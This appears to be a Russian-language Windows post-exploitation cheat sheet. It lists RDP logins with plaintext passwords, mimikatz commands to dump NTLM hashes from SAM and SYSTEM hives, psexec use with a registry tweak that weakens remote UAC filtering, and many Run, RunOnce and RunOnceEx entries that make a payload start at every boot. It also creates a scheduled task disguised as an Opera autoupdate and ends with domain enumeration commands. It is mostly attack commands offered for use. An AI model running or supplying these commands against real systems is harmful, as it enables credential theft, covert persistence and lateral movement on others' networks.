# Up_windows
Подключение по РДП
rdesktop -u Administrator -p Admin123 -d ROOT.DC 192.168.50.200  
для машины в рабочей группе xfreerdp /u:Alexs /p:2013 /v:192.168.50.232
xfreerdp /v:192.168.50.200 /d:root.dc /u:administrator /p:Admin123










Как извлечь хеш пароля пользователя NTLM из файлов реестра



.\mimikatz.exe
lsadump::sam /system:C:\Share-Server\files\SYSTEM /sam:C:\Share-Server\files\SAM




Psexec -i \\192.168.50.200 -u administrator -s cmd.exe Привелигерованный режим... (если уже админ то ситем)
для psexec
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f




Автозагрузка.....
Если у вас права обычного пользователя, следует использовать ветку реестра HKCU

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"
 
reg add "HKCU\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\Users\idyachkov\payload.exe"



Если у вас есть админские права в системе, следует использовать ветку HKLM — в таком случае каждый раз при запуске системы будет выполняться payload.exe или dll. Этот способ хорош тем, что не зависит от пользователя, который логинится в систему.

reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001" /v payload /t REG_SZ /d "C:\tmp\payload.exe"
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend" /v payload /t REG_SZ /d "C:\tmp\payload.dll"
 
reg add “HKLM\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run” /v payload /t REG_SZ /d “C:\tmp\payload.exe”


Пример создания запланированной задачи:

schtasks /create /sc minute /mo 5 /tn "Opera scheduled Autoupdate 1594994248" /tr C:\tmp\Opera_autoupdate1594994248.exe

chcp 65001

psexec -i \\\adress -u user cmd
***************************************************************************************************************************************************
Cбор информации в домене 
net user /domain пользователи домена
Get-ADUser -identity administrator -properties *
Get-ADUser -identity administrator -properties memberof

net user administrator /domain в какие группы входит пользователь
net group "domain admins" кто входит в группы

Get-ADcomputer -filter * -properties * | ft nmae, ipv4adress компутеры в домене
net group "domain computer"



